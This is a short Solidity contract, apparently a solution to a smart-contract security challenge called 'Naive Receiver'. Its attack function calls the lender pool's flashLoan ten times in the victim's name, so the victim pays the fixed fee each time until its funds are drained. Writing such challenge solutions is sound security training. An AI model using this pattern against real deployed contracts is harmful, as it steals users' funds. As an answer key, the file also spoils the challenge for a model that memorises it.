// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    using Address for address payable;

    function attack(NaiveReceiverLenderPool _lender, address _victim) external {
        for(uint8 i = 0; i < 10; i++)
            _lender.flashLoan(_victim, _lender.fixedFee());
    }
}